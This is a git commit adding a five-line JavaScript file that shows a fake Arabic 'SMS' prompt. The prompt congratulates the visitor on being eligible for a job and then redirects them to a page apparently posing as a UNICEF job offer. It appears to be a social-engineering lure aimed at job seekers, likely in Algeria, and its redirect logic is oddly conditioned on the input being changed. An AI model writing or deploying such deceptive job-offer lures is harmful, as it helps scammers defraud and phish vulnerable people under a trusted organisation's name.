eb036a6e90117baf1cc535bd1b69607d431000b6
surepluger <adigunkola666@gmail.com>
2025-03-27 11:25:55 +0100

    Create algeria-active.js

---
+++ algeria-active.js
@@ -0,0 +1,5 @@
+var password = 'قدم الآن'
+password=prompt('SMS: مبروك أنت مؤهل للعمل معنا، اضغط موافق لتقديم طلبك الآن ','قدم الآن');
+if (password != 'قدم الآن') {
+location.href='https://sureplug.org/unicef-job';
+}
